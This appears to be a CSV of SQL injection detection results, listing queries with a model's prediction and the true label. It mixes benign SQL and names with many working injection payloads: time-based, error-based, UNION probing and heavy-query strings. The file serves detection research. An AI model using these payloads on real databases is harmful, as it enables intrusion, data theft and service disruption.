,Query,Prediction,Actual
318,samm@lawn.sn,0,0.0
319,select sleep  (  5  )   and    (    (     (  'thqr' like 'thqr,1,1.0
320,"-8924   )    )    as jybr where 7901  =  7901 or elt  (  1032  =  1032,3623  )  --",1,1.0
321,!,0,1.0
322,"1""  )   where 9020  =  9020 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1,1.0
323,SELECT * FROM recognize ORDER BY floor DESC,0,0.0
324,SELECT * FROM camp ORDER BY ants,0,0.0
325,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,1,1.0
326,SELECT * FROM right FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM grow,0,0.0
327,SELECT * FROM action WHERE broad = 'fight' LIMIT 3,0,0.0
328,SELECT MIN ( bus )  AS bus FROM build,0,0.0
329,SELECT * FROM  ( SELECT serious FROM salt ) ,0,0.0
330,"   SELECT stranger, adult+ ', ' + few+ ' ' + yet+ ', ' + chair AS friendly  FROM properly",0,0.0
331,SELECT * FROM said WHERE slowly = 'lose',0,0.0
332,"1'||  (  select 'zqdn' where 6194  =  6194 union all select null,null,null,null--",1,1.0
333,"INSERT INTO cool  ( mile, thank, leaf )  VALUES  ( 'row', 'tribe', 'rope' )  ",0,0.0
334,"  SELECT pleasant,excited,spend FROM arm LEFT JOIN Orders ON get.winID =  rice.there ORDER BY community.work",0,0.0
335,1'||  (  select 'ytwz' from dual where 3025  =  3025 and   (  5039  =  5303  )  *5303  )  ||',1,1.0
336,"-8436'  )   as frmf where 7225  =  7225 or make_set  (  9354  =  9354,7185  )  --",1,1.0
337,remberta,0,0.0
338,5632,0,0.0
339,drohocka@baybay.mq,0,0.0
340,50830,0,0.0
341,brot calderer,0,0.0
342,"1'  )   as rqfq where 7077  =  7077 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1.0
343,"1%""  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1.0
344,"   SELECT question, barn, lieFROM current WHERE burst  IS NOT NULL",0,0.0
345,SELECT * FROM  ( SELECT harder FROM hole ) ,0,0.0
346,SELECT * FROM attention FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM hay,0,0.0
347,"1   )    )    union all select null,null--",1,1.0
348,SELECT * FROM  ( SELECT alive FROM fruit ) ,0,0.0
349,"1'   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'narn'  =  'narn",1,1.0
350,SELECT wheel ( s )  FROM cow LEFT JOIN,0,0.0
351,palmario,0,0.0
352,SELECT AVG ( space ) FROM live SELECT SUM ( party ) ,0,0.0
353,"1  )   as rsyw where 4857  =  4857 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1,1.0
354,"  SELECT * FROM swept WHERE thirty IN  ( 'sang', 'almost', 'take' )  ",0,0.0
355,"-1907""   )    )    or 2782  =  3591",0,1.0
356,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'swua' like 'swua",1,1.0
357,"1""   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  ""zgoy"" like ""zgoy",1,1.0
358,terland-bartha5@informatica2009.ck,0,0.0
359,neugebauer@buscamoto.gw,0,0.0
360,acedera,0,0.0
361,"1'   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   'ylql' like 'ylql",1,1.0
362,1' waitfor delay '0:0:5' and 'jree'  =  'jree,1,1.0
363,eccles@aspirantes.gh,0,0.0
364,terraje,0,0.0
365,"1'  )   union all select null,null,null,null,null,null,null,null#",1,1.0
366,"1%""  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,1.0
367," SELECT * FROM remove ORDER BY knowledge, yellow",0,0.0
368,SELECT * FROM torn WHERE addition LIKE '%hide%',0,0.0
369,"1   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   9325  =  9325",1,1.0
370,"-5891 union all select 7103,7103,7103,7103--",0,1.0
371,SELECT * FROM  ( SELECT fresh FROM left ) ,0,0.0
372,"select * from generate_series  (  4465,4465,case when   (  4465  =  6232  )   then 1 else 0 end  )   limit 1--",1,1.0
373,1  )   where 5442  =  5442,0,1.0
374," SELECT * FROM his ORDER BY gulf, perfectly",0,0.0
375,"1%""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""%""  =  """,1,1.0
376,-2717'   )    )     )   or 8571  =  8571--,1,1.0
377,"-7565'   )    )    union all select 7745,7745,7745,7745,7745,7745#",0,1.0
378,UNION ALL SELECT,1,1.0
379,pladeval berganciano,0,0.0
380,"1""   )    )    as vdbf where 7969  =  7969 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1,1.0
381,1'  )   where 6842  =  6842,0,1.0
382,"-6095""  )   as hygc where 8142  =  8142 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,1.0
383,"1""   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,1.0
384,SELECT * FROM sudden WHERE pig = 'pile'  OR hand = 'mix',0,0.0
385,end# ckxq,1,1.0
386,ch9let_a,0,0.0
387," select * from users where id  =  1 or ""%?"" or 1  =  1 -- 1",1,1.0
388,2.21E+15,0,0.0
389,"  UPDATE driven SET become =  'given', City =  'whispered' WHERE silence =  pool",0,0.0
390,SELECT * FROM surrounded FETCH FIRST 50 PERCENT ROWS ONLY,0,0.0
391,SELECT * FROM second WHERE star = 'island'  OR river = 'beside',0,0.0
392,SELECT * FROM hill WHERE mother = 'firm'  AND City = 'ate',0,0.0
393,SELECT COUNT ( early ) FROM your,0,0.0
394,1   )    )    as xoch where 8765  =  8765 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1,1.0
395,40133,0,0.0
396,select sleep  (  5  )   and    (    (   '%'  =  ',1,1.0
397,"1'  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,1.0
398,SELECT blank ( s ) FROM yard INNER JOIN,0,0.0
399,SELECT tears FROM gain,0,0.0
400,SELECT so ( s )  FROM blue LEFT JOIN,0,0.0
401,SELECT MIN ( short )  AS frame FROM mirror,0,0.0
402,marquand@eneltajo.bn,0,0.0
403,select   (  case when   (  7169  =  7785  )   then 1 else 7169*  (  select 7169 from master..sysdatabases  )   end  )  --,1,1.0
404,SELECT MIN ( surprise )  AS support FROM work,0,0.0
405,"-1302""   )    )    as rshr where 2800  =  2800 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1,1.0
406,"-4764""   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""dfvz"" like ""dfvz",1,1.0
407," select * from users where id  =  1. union select null,version  (    )   -- 1",1,1.0
408,1'   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,1.0
409,grandy,0,0.0
410,tyler,0,0.0
411,"1%"" or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""%""  =  """,1,1.0
412,"INSERT INTO town  ( continued, order, would )  VALUES  ( 'sell', 'cake', 'industrial' )  ",0,0.0
413,1 or sleep  (  5  )  # tdgb,1,1.0
414,"1"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""ekjs"" like ""ekjs",1,1.0
415,FROM  ( SELECT DISTINCT ran FROM outline ) ,0,0.0
416,"-7945%'   )    )     )   union all select 4286,4286,4286,4286,4286,4286--",1,1.0
417,SELECT * FROM herself WHERE    NOT gas = 'loud',0,0.0
418,"  SELECT ATAN2 ( 0.50, 1 ) ;",0,0.0
419,goman@fbi-criminal-network.com.mh,0,0.0
420,"1""   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   ""dtfg""  =  ""dtfg",1,1.0
421,SELECT AVG ( scientific ) FROM southern,0,0.0
422,SELECT * FROM bank WHERE speech = 'class'  AND City = 'value',0,0.0
423,"-3729'   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'czed'  =  'czed",1,1.0
424,SELECT * FROM closely WHERE main BETWEEN 'joined' AND 'universe',0,0.0
425,"  SELECT safetyID AS ID, row AS me FROM action",0,0.0
426,"   SELECT writing, fireplace, imagineFROM habit WHERE process  IS NOT NULL",0,0.0
427,"  (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",1,1.0
428,1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  # bkjl,1,1.0
429,"SELECT DATE ( ""The   date is 2017-06-15"" ) ;",0,0.0
430,SELECT bell ( s )  FROM only LEFT JOIN,0,0.0
431,SELECT AVG ( Price ) FROM consider,0,0.0
432,lamentante,0,0.0
433,1   )    )     )   and sleep  (  5  )   and    (    (     (  6618  =  6618,1,1.0
434,verani@viajesdacapalla.gq,0,0.0
435,-1219'  )   or 5592  =  4835,0,1.0
436,gervasio,0,0.0
437,SELECT * FROM noise ORDER BY president DESC,0,0.0
438,forsyne@velaconsultores.mx,0,0.0
439,"-3729'   )    )    or elt  (  4482  =  2648,2648  )   and    (    (   'vkkr' like 'vkkr",1,1.0
440,"-1684""   )    )     )   union all select 7473,7473#",1,1.0
441,"-3151%""   )    )     )   union all select 6250,6250,6250,6250,6250,6250,6250,6250,6250,6250#",0,1.0
442,76971829y,0,0.0
443,3.61612E+15,0,0.0
444,arcos,0,0.0
445,SELECT * FROM floating WHERE magic NOT BETWEEN 'worse' AND 'conversation',0,0.0
446,DELETE FROM mile,0,0.0
447,mathurin,0,0.0
448,"SELECT * FROM living WHERE driven BETWEEN ""him"" AND    ""consist""",0,0.0
449,SELECT * FROM entire FETCH FIRST 50 PERCENT ROWS ONLY,0,0.0
450,"   SELECT Employees.wide, COUNT ( Orders.alreadyID )  AS spiteFROM    ( OrdersINNER JOIN away ON Orders.wireID  =  Employees.contrastID ) ",0,0.0
451,"  SELECT perfectID AS ID, loss AS these FROM half",0,0.0
452," end and    (    (     (  ""poee""  =  ""poee",1,1.0
453,7.98317E+15,0,0.0
454,gates,0,0.0
455,"  SELECT driverID AS ID, string AS year FROM event",0,0.0
456,-2129'  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'eutm' like 'eutm,1,1.0
457,SELECT AVG ( himself ) FROM tip SELECT SUM ( finger ) ,0,0.0
458,SELECT * FROM die WHERE ball = 'edge',0,0.0
459,SELECT * FROM Customers  WHERE CustomerName NOT LIKE 'a%';,0,0.0
460,SELECT AVG ( food ) FROM sit SELECT SUM ( wave ) ,0,0.0
461,SELECT * FROM mother WHERE mark = 'thrown'  AND  ( cap = 'half' OR flag = 'factor' ) ,0,0.0
462,"1""   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   ""ghdr"" like ""ghdr",1,1.0
463,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",0,1.0
464,SELECT * FROM sure WHERE mass = 'unknown'  OR leaving = 'worse',0,0.0
465,-1643' where 1968  =  1968 or 3484  =  6642,1,1.0
466,SELECT TOP 3 * FROM before,0,0.0
467,1'   )    )    waitfor delay '0:0:5'--,1,1.0
468,-5555   )    )    as ldte where 4583  =  4583 order by 1#,0,1.0
469,otorgamiento,0,0.0
470,"INSERT INTO stay  ( pond, desk, addition )  VALUES  ( 'lunch', 'completely', 'active' )  ",0,0.0
471,"1'  )   as vmmk where 5757  =  5757 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1.0
472,SELECT MIN ( using )  AS rays FROM later,0,0.0
473,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  ""layz""  =  ""layz",1,1.0
474,"   SELECT Employees.blew, COUNT ( Orders.sentID )  AS paperFROM    ( OrdersINNER JOIN man ON Orders.girlID  =  Employees.cowID ) ",0,0.0
475,"-5849  )   union all select 6168,6168,6168,6168,6168,6168,6168,6168#",1,1.0
476,benavente,0,0.0
477,"1""   )    )    as uaxn where 5657  =  5657 rlike   (  select   (  case when   (  3548  =  7206  )   then 1 else 0x28 end   )    )   --",1,1.0
478,"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 5421 )  ORDER BY meta_id ASC",0,0.0
479,"1'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'cogf' like 'cogf",1,1.0
480,1 where 5311  =  5311 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,1.0
481,SELECT * FROM seed WHERE idea = 'contain'  OR continued = 'science',0,0.0
482,werling,0,0.0
483,viver,0,0.0
484,SELECT window,0,0.0
485,"-4347' union all select 6074,6074,6074,6074,6074,6074,6074--",1,1.0
486,SELECT * FROM while WHERE am IN  ( SELECT stove FROM instance ) ,0,0.0
487,"   SELECT COUNT ( again ) , won FROM citizen BY thick",0,0.0
488,g5adae3a,0,0.0
489,SELECT MIN ( being )  AS pie FROM call,0,0.0
490,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",0,1.0
491,SELECT vessels FROM of,0,0.0
492,"1   )    )    as khvx where 7533  =  7533 union all select null,null,null,null,null,null,null,null--",1,1.0
493,"-8875""  )   where 8428  =  8428 or 1519  =  5756--",0,1.0
494,"-8981%""   )    )     )   union all select 4538,4538,4538,4538,4538,4538,4538#",0,1.0
495,santo,0,0.0
496,1' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and 'hyun' like 'hyun,1,1.0
497,"  UPDATE case SET answer =  'cheese', City =  'party' WHERE social =  cannot",0,0.0
498,"1"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""phcl"" like ""phcl",1,1.0
499,"1""  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  ""mhfc""  =  ""mhfc",1,1.0
500,"c/ mijancas, 154 3?c",0,0.0
501,SELECT * FROM parallel WHERE eventually NOT LIKE 'parts%',0,0.0
502,"1%""   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",1,1.0
503,"-9145'  )   as xyya where 8950  =  8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--",0,1.0
504,pesado,0,0.0
505,SELECT * FROM smell  WHERE roar NOT LIKE '[review]%',0,0.0
506,SELECT TOP 50 PERCENT * FROM engineer,0,0.0
507,grajera sampol,0,0.0
508,   ( SELECT column_name  FROM table_name  WHERE condition  ) ;,0,0.0
509,SELECT just,0,0.0
510,SELECT Count ( * )  AS rain,0,0.0
511,"1""  )   where 6367  =  6367 union all select null,null,null,null,null,null,null#",1,1.0
512,4897,0,0.0
513,"  SELECT classID AS ID, sport AS automobile FROM feet",0,0.0
514,SELECT AVG ( Price ) FROM check,0,0.0
515,"-7078'||  (  select 'lcza' where 5076  =  5076 union all select 5076,5076,5076,5076,5076,5076,5076,5076,5076,5076--",0,1.0
516,SELECT COUNT ( represent )  FROM purple,0,0.0
517,1%'  )   and   (  3020  =  3020  )  *6703 and   (  '%'  =  ',1,1.0
518,SELECT AVG ( crack ) FROM lost SELECT SUM ( paper ) ,0,0.0
519,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  ""%""  =  """,1,1.0
520,SELECT MIN ( occasionally )  AS courage FROM current,0,0.0
521,1  )   waitfor delay '0:0:5'--,1,1.0
522,maestro vitoria 10,0,0.0
523,"-5652%'  )   union all select 4447,4447,4447,4447,4447,4447,4447,4447,4447--",1,1.0
524,-7426' order by 1#,0,1.0
525,SELECT COUNT ( steady ) FROM recognize,0,0.0
526,"  SELECT sport AS lie, kind AS [canal]  FROM current",0,0.0
527,efran,0,0.0
528,SELECT * FROM prize FETCH FIRST 50 PERCENT ROWS ONLY,0,0.0
529,87348482w,0,0.0
530,SELECT * FROM sunlight WHERE tired = 'coming'  AND City = 'watch',0,0.0
531,SELECT column_name FROM table1 FULL OUTER JOIN table2 ON table1.column_name  =  table2.column_name WHERE condition ;,0,0.0
532,24711,0,0.0
533,"1%"" and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1.0
534,"-8069   )    )    as sxbn where 7689  =  7689 union all select 7689,7689,7689,7689,7689,7689,7689,7689,7689,7689--",1,1.0
535, and 1  =  0  )   union all,1,1.0
536,SELECT listen ( s )  FROM trace SELECT whatever FROM aside,0,0.0
537,SELECT * FROM  ( SELECT baseball FROM soon ) ,0,0.0
538,48638626c,0,0.0
539,SELECT * FROM load WHERE living  BETWEEN 10 AND 20,0,0.0
540,"1   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  4858  =  4858",1,1.0
541,"1""   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  ""ijag""  =  ""ijag",1,1.0
542," select * from users where id  =  1 or ""1#"" or 1  =  1 -- 1",1,1.0
543,huyente,0,0.0
544,"1   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   5336  =  5336",1,1.0
545,"  SELECT dropped AS right, common AS [accident]  FROM art",0,0.0
546," SELECT * FROM swimming ORDER BY slept ASC, closer DESC",0,0.0
547,hermine@943.mw,0,0.0
548,end and   (  'hmtt' like 'hmtt,1,1.0
549,SELECT expect ( s )  FROM say LEFT JOIN,0,0.0
550,"INSERT INTO angry  ( memory, built, riding )  VALUES  ( 'tried', 'seeing', 'finest' )  ",0,0.0
551,arpe*nde,0,0.0
552,"1'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  'peyy'  =  'peyy",1,1.0
553,SELECT MIN ( flat )  AS lower FROM railroad,0,0.0
554,"-4233%""  )   or   (  8459  =  8459  )  *4906 and   (  ""%""  =  """,1,1.0
555,"1""  )   union all select null,null,null,null,null--",1,1.0
556,SELECT * FROM thus,0,0.0
557,brincones,0,0.0
558,SELECT * FROM down WHERE child NOT LIKE '[question]%',0,0.0
559,carretera 200 hasta km. 1 barra de mio 175,0,0.0
560,select   (  case when   (  9103  =  9836  )   then 9103 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,1.0
